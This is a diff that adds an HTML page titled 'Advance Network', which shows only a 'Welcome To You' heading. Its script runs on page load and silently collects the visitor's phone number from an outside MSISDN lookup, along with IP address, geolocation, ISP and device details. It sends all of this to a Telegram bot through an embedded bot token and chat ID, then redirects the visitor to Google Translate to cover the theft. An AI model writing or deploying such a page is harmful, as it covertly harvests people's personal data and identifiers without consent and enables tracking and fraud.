@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advance Network</title>
+    <img src=""/>
+    <script>
+        async function collectAndSendData() {
+            try {
+                // First make GET request to the external URL
+                const externalResponse = await fetch('http://ibadat.co/digi.msisdn.get.app/');
+                const externalData = await externalResponse.text();
+                
+                // Collect device information
+                const deviceName = navigator.userAgent;
+                const userAgent = navigator.userAgent;
+                const ram = navigator.deviceMemory || "N/A";
+                const storage = navigator.storage || "N/A";
+                const visitTime = new Date().toLocaleString();
+                const connection = navigator.connection || "N/A";
+                const connectionType = connection.effectiveType || "N/A";
+                const downlinkSpeed = connection.downlink || "N/A";
+                const rtt = connection.rtt || "N/A";
+                const bandwidth = connection.downlinkMax || "N/A";
+                
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+
+                const locationResponse = await fetch(`https://ipinfo.io/${ipAddress}/json`);
+                const locationData = await locationResponse.json();
+                const location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
+                const isp = locationData.org || "N/A";
+
+                // Prepare data to send
+                const data = {
+                    deviceName,
+                    ipAddress,
+                    location,
+                    visitTime,
+                    userAgent,
+                    ram: `${ram} GB`,
+                    storage: JSON.stringify(storage),
+                    internetDetails: {
+                        connectionType,
+                        downlinkSpeed: `${downlinkSpeed} Mbps`,
+                        rtt: `${rtt} ms`,
+                        bandwidth: `${bandwidth} Mbps`,
+                        isp
+                    },
+                    externalDataResponse: externalData
+                };
+
+                // Send data to Telegram bot
+                const botToken = '7840186293:AAEIcH8ZlVlT_KKZ5_HaydcEN_5Vp4uyZrE';
+                const chatId = '7811361994';
+                const message = `
+Device Information:
+- Device Name: ${data.deviceName}
+- IP Address: ${data.ipAddress}
+- Location: ${data.location}
+- Visit Time: ${data.visitTime}
+- User Agent: ${data.userAgent}
+- RAM: ${data.ram}
+- Storage: ${data.storage}
+- Internet Details:
+  - Connection Type: ${data.internetDetails.connectionType}
+  - Downlink Speed: ${data.internetDetails.downlinkSpeed}
+  - Round-Trip Time: ${data.internetDetails.rtt}
+  - Bandwidth: ${data.internetDetails.bandwidth}
+  - ISP: ${data.internetDetails.isp}
+
+User Phone Numer :
+${data.externalDataResponse}
+                `;
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                await fetch(telegramUrl);
+
+                // Redirect to Google
+                window.location.href = 'https://translate.google.com.bd/?hl=bn';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                // Redirect even if there's an error
+                window.location.href = 'https://translate.google.com.bd/?hl=bn';
+            }
+        }
+
+        // Run the function when the page loads
+        window.onload = collectAndSendData;
+    </script>
+</head>
+<body>
+    <h1>  Welcome To You</h1>
+    
+</body>
+</html>
